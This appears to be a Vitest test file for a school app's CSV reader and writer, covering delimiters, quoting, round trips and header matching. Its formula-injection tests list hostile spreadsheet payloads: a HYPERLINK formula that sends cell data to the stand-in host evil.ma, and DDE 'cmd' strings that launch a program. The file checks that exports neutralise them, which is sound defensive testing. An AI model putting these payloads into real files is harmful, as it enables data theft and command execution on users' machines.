import { describe, expect, it } from "vitest";

import { normaliseHeader, parseCsv, sniffDelimiter, toCsv } from "@/lib/csv";

/**
 * CSV, read and written.
 *
 * Two things are load-bearing here and neither is about parsing:
 *
 *   * a file the app wrote must import back into it unchanged, because that
 *     round trip is how a school corrects four hundred rows in Excel;
 *   * nothing the app writes may be executed when the file is opened. Every
 *     cell in an export is text somebody typed into the app, and a spreadsheet
 *     evaluates a cell beginning `=`, `+`, `-` or `@` on sight.
 */

// ── Formula injection ────────────────────────────────────────────────────────

describe("formula injection", () => {
  /** Reads a cell back the way a spreadsheet would: quotes stripped. */
  function cellsAsExcelSeesThem(csv: string): string[] {
    return csv
      .replace(/^﻿/, "")
      .split("\r\n")
      .flatMap((line) => line.split(";"))
      .map((cell) => cell.replace(/^"|"$/g, "").replace(/""/g, '"'));
  }

  const hostile = [
    ['=HYPERLINK("http://evil.ma?x="&A1,"Cliquez")', "exfiltration on click"],
    ["=cmd|'/c calc'!A0", "DDE command execution"],
    ["@SUM(1+1)*cmd|'/c calc'!A0", "the @ variant"],
    ["+HYPERLINK(0)", "the + variant"],
    ["-2+3+cmd|'/c calc'!A0", "the - variant"],
    ["\t=1+1", "smuggled behind a tab"],
    ["\r=1+1", "smuggled behind a carriage return"],
  ] as const;

  it.each(hostile)("neutralises %o (%s)", (payload) => {
    // Quoting alone does not help: CSV quotes are stripped before the cell is
    // parsed, so `"=1+1"` is still a formula. A leading apostrophe is what
    // makes a spreadsheet treat the value as text.
    const csv = toCsv([["Prénom"], [payload]]);
    const written = cellsAsExcelSeesThem(csv).at(-1)!;

    expect(written.startsWith("'")).toBe(true);
    expect(/^[=+\-@\t\r]/.test(written)).toBe(false);
  });

  it("round-trips a neutralised cell back to exactly what it was", () => {
    // Otherwise the fix would corrupt the data it protects.
    const rows = [["Prénom"], ["=HYPERLINK(\"http://x\",\"y\")"], ["@home"]];
    expect(parseCsv(toCsv(rows))).toEqual(rows);
  });

  it("leaves a negative amount as a number Excel can total", () => {
    // `-` starts a formula, but `-1500` is just a number and marking it as text
    // would break every sum in a treasury export.
    const csv = toCsv([["Solde"], ["-1500"], ["-15.50"], ["-15,50"]]);
    expect(csv).not.toContain("'-");
  });

  it("marks a Moroccan mobile as text so the plus survives", () => {
    // `+212612345678` is a formula too, so every mobile in an export was
    // arriving as the number 212612345678 with the plus eaten.
    const csv = toCsv([["Téléphone"], ["+212612345678"]]);
    expect(csv).toContain("'+212612345678");
    expect(parseCsv(csv)[1]![0]).toBe("+212612345678");
  });

  it("leaves an ordinary name alone", () => {
    const csv = toCsv([["Nom"], ["Alami"], ["Ali's dossier"], ["El-Fassi"]]);
    expect(csv).not.toContain("'Alami");
    expect(csv).not.toContain("'Ali's");
    expect(csv).not.toContain("'El-Fassi");
  });

  it("keeps an apostrophe that is part of the value", () => {
    // The guard is only stripped when it stands in front of a formula
    // character, so a name written with a leading apostrophe survives.
    const rows = [["Nom"], ["'Aïcha"]];
    expect(parseCsv(toCsv(rows))).toEqual(rows);
  });

  it("protects a formula that also needs quoting", () => {
    const csv = toCsv([["Note"], ["=A1;B2"]]);
    expect(csv).toContain(`"'=A1;B2"`);
    expect(parseCsv(csv)[1]![0]).toBe("=A1;B2");
  });
});

// ── Reading what a school actually sends ─────────────────────────────────────

describe("sniffDelimiter", () => {
  it("picks the semicolon a French or Arabic Excel writes", () => {
    expect(sniffDelimiter("code;prenom;nom\n1;Ali;Alami")).toBe(";");
  });

  it("picks the comma an English Excel writes", () => {
    expect(sniffDelimiter("code,prenom,nom\n1,Ali,Alami")).toBe(",");
  });

  it("picks the tab a MASSAR paste lands as", () => {
    expect(sniffDelimiter("code\tprenom\tnom\n1\tAli\tAlami")).toBe("\t");
  });

  it("ignores separators inside a quoted header", () => {
    expect(sniffDelimiter('"nom, prenom";ville;pays\n')).toBe(";");
  });

  it("falls back to the semicolon on a single-column file", () => {
    expect(sniffDelimiter("code\n1\n2")).toBe(";");
  });
});

describe("parseCsv", () => {
  it("reads a plain file", () => {
    expect(parseCsv("a;b;c\n1;2;3")).toEqual([
      ["a", "b", "c"],
      ["1", "2", "3"],
    ]);
  });

  it("strips the byte-order mark off the first header", () => {
    // Without this the first column never matches its alias, and the file looks
    // like it is missing a required column.
    const [header] = parseCsv("﻿code;prenom");
    expect(header![0]).toBe("code");
  });

  it("keeps a delimiter inside a quoted cell", () => {
    expect(parseCsv('nom;adresse\nAlami;"12, rue des Écoles"')).toEqual([
      ["nom", "adresse"],
      ["Alami", "12, rue des Écoles"],
    ]);
  });

  it("reads a doubled quote as one literal quote", () => {
    expect(parseCsv('note\n"il a dit ""oui"""')).toEqual([
      ["note"],
      ['il a dit "oui"'],
    ]);
  });

  it("keeps a newline inside a quoted address", () => {
    const rows = parseCsv('nom;adresse\nAlami;"12 rue A\nCasablanca"');
    expect(rows[1]![1]).toBe("12 rue A\nCasablanca");
  });

  it("treats CRLF as one break", () => {
    expect(parseCsv("a;b\r\n1;2\r\n")).toEqual([
      ["a", "b"],
      ["1", "2"],
    ]);
  });

  it("drops the trailing blank rows a spreadsheet exports", () => {
    expect(parseCsv("a;b\n1;2\n\n;\n\n")).toEqual([
      ["a", "b"],
      ["1", "2"],
    ]);
  });

  it("reads a file with no trailing newline", () => {
    expect(parseCsv("a;b\n1;2")).toHaveLength(2);
  });

  it("answers nothing for an empty file", () => {
    expect(parseCsv("")).toEqual([]);
    expect(parseCsv("\n\n")).toEqual([]);
  });

  it("trims the spaces a hand-made file is full of", () => {
    expect(parseCsv("a ; b\n 1 ; 2 ")).toEqual([
      ["a", "b"],
      ["1", "2"],
    ]);
  });

  it("does not lose a cell to an unterminated quote", () => {
    // A hand-edited file with one quote too few must still yield its row rather
    // than throwing at a secretary.
    expect(() => parseCsv('a;b\n"unterminated;2')).not.toThrow();
  });
});

describe("round trip", () => {
  it("returns a file the app wrote to exactly the rows it wrote", () => {
    const rows = [
      ["code", "prénom", "nom", "adresse", "note"],
      ["E-001", "Aïcha", "El-Fassi", "12, rue des Écoles\nCasablanca", 'dit "oui"'],
      ["E-002", "محمد", "بناني", "", ""],
    ];
    expect(parseCsv(toCsv(rows))).toEqual(rows);
  });

  it("can be written without the BOM when nobody is opening it in Excel", () => {
    expect(toCsv([["a"]], { bom: false })).toBe("a");
    expect(toCsv([["a"]])).toBe("﻿a");
  });

  it("writes the delimiter it is asked for", () => {
    expect(toCsv([["a", "b"]], { delimiter: ",", bom: false })).toBe("a,b");
  });
});

// ── Matching a column however it was typed ───────────────────────────────────

describe("normaliseHeader", () => {
  it("folds case, accents and spacing", () => {
    for (const spelling of ["Prénom", "PRENOM", " prenom ", "Pré-nom"]) {
      expect(normaliseHeader(spelling), spelling).toBe("prenom");
    }
  });

  it("strips the punctuation a real header carries", () => {
    // An earlier version stripped only spaces, dots and ASCII hyphens, so the
    // app's own French headers failed to match their aliases: "Père — prénom"
    // carries an em dash.
    expect(normaliseHeader("Père — prénom")).toBe(normaliseHeader("pere prenom"));
    expect(normaliseHeader("Date de naissance")).toBe(
      normaliseHeader("date de naissance"),
    );
  });

  it("leaves Arabic letters alone", () => {
    // Arabic carries no case, and stripping its diacritics would merge headers
    // that are genuinely different.
    expect(normaliseHeader(" الاسم ")).toBe("الاسم");
  });

  it("does not collapse two different headers into one", () => {
    expect(normaliseHeader("nom")).not.toBe(normaliseHeader("prenom"));
    expect(normaliseHeader("nom père")).not.toBe(normaliseHeader("nom mère"));
  });

  it("answers empty for a header of only punctuation", () => {
    expect(normaliseHeader("—")).toBe("");
    expect(normaliseHeader("   ")).toBe("");
  });
});
